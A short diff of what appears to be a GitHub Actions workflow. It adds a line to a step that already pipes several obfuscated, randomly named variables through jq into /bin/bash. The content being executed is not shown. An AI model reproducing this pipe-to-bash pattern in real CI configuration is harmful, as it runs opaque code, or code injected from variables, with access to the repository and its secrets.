@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$eifun6817" | jq -r .jwuo5952 | /bin/bash
           echo $ckl85707 | jq -r .nnzx805 | /bin/bash
           printf '%s' "$al05" | jq -r .nnhqo76488 | /bin/bash
+          echo $t7 | jq -r .war8903 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
